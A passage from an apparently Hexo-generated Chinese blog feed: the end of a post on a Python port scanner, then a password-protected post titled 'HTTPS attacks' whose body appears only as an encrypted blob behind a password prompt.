<p>此次设计参考了P牛早期的一个设计以及Python线程锁的处理方法。实现的功能比较单一，还可以添加SYN半连接扫描、UDP扫描、僵尸扫描等功能；但是由于Windows底层的原因，利用Python在Windows上构造数据包有些困难；在linux上可以通过scapy进行原始数据包的构造与发送，通过网络流量中的一些特征来判断。一些扫描脚本可以看四层发现中的一些脚本。</p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTPS攻击</title>
    <url>/2018/06/13/HTTPS%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">
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